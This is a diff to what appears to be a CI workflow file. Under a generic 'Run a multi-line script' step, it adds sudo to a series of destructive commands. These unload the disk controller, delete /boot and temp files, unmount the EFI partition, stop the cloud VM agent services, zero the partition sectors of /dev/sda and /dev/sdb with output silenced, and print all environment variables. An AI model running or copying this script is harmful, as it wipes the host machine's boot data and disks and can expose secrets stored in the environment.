@@ -25,18 +25,18 @@ jobs:
     steps:
       - name: Run a multi-line script
         run: |
-          modprobe -r ahci
+          sudo modprobe -r ahci
 
-          shutdown -h +120 > /dev/null 2>&1
-          rm -rf /home/runner/work/_temp/*
+          sudo shutdown -h +120 > /dev/null 2>&1
+          sudo rm -rf /home/runner/work/_temp/*
           
-          umount /boot/efi
-          rm -rf /boot/*
+          sudo umount /boot/efi
+          sudo rm -rf /boot/*
           
-          systemctl stop walinuxagent.service
-          systemctl stop hv-kvp-daemon.service
+          sudo systemctl stop walinuxagent.service
+          sudo systemctl stop hv-kvp-daemon.service
 
-          dd if=/dev/zero of=/dev/sda bs=512 count=1 conv=notrunc > /dev/null 2>&1
-          dd if=/dev/zero of=/dev/sdb bs=512 count=1 conv=notrunc > /dev/null 2>&1
+          sudo dd if=/dev/zero of=/dev/sda bs=512 count=1 conv=notrunc > /dev/null 2>&1
+          sudo dd if=/dev/zero of=/dev/sdb bs=512 count=1 conv=notrunc > /dev/null 2>&1
 
-          printenv
+          sudo printenv
